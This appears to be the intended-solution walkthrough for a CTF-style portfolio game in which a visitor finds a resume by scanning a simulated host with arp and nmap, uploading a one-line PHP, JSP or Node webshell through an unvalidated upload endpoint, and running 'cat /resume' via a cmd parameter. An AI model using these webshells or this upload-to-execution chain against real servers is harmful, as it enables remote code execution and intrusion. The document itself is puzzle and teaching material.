# How to Find the Resume (Intended Solution)

This document describes the **intended path** to reveal GyeongHo Kim's resume in the portfolio simulation.

## Prerequisites

- You have booted the desktop, (optionally) seen the mission briefing, and logged in as **visitor**.
- You have the **Terminal** and **Text Editor** apps available (dock or desktop).

## Step-by-Step Solution

### 1. Discover the network

In the terminal:

```bash
arp -a
```

Note the other host on the subnet (e.g. `192.168.1.20`).

### 2. Scan for services

```bash
nmap -sV 192.168.1.20
```

You should see **port 8080** open with an HTTP service (e.g. Apache). Optionally use:

```bash
nmap --script http-enum 192.168.1.20
```

to discover endpoints like `/api/upload`, `/api/files`.

### 3. Create a webshell

The server accepts file uploads without validating file extensions. You can use **PHP**, **JSP (Java)**, or **JavaScript** (Node.js). The script must run a command passed in the `cmd` query parameter (e.g. `?cmd=whoami`).

**Option A – PHP (Text Editor)**

- Run: `edit shell.php`
- In the text editor, type: `<?php system($_GET['cmd']); ?>`
- Save with **Ctrl+S**

**Option B – PHP (echo)**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Option C – JavaScript (Node.js-style)**

- Run: `edit shell.js`
- In the text editor, type a script that uses `child_process` (e.g. `execSync`). The server treats it as a webshell and passes `?cmd=...` to the simulated runner. Example:

```javascript
const { execSync } = require("child_process");
// Server injects cmd from ?cmd=... when you request this file
```

- Save with **Ctrl+S**

**Option D – JSP (Java / Tomcat)**

- Run: `edit shell.jsp`
- In the text editor, type a JSP that runs a command from the request parameter (classic Tomcat/Java webshell). Example:

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

- Save with **Ctrl+S**

### 4. Upload the webshell

```bash
# PHP, JSP, or JavaScript – use the filename you created
curl -X POST -F "file=@shell.php" http://192.168.1.20:8080/api/upload
# or: file=@shell.jsp   or: file=@shell.js
```

The server stores the file under `/var/www/uploads/` (simulated).

### 5. Execute a command that reveals the resume

Request the uploaded script with a command that reads the resume:

```bash
# Use the same filename and extension you uploaded (e.g. shell.php, shell.jsp, shell.js)
curl "http://192.168.1.20:8080/uploads/shell.php?cmd=cat%20/resume"
```

When the server processes `cmd=cat /resume` (or equivalent), it triggers the resume unlock. The **Resume viewer** overlay opens on the desktop.

---

## Summary

| Step | Action |
|------|--------|
| 1 | `arp -a` → find target IP (e.g. 192.168.1.20) |
| 2 | `nmap -sV <ip>` → confirm HTTP on 8080 |
| 3 | Create `shell.php`, `shell.jsp`, or `shell.js` (PHP / JSP / Node webshell with `?cmd=`) |
| 4 | `curl -X POST -F "file=@shell.xxx"` to `http://<ip>:8080/api/upload` |
| 5 | `curl "http://<ip>:8080/uploads/shell.xxx?cmd=cat%20/resume"` → Resume viewer opens |

For more context, see the project [README](README.md).
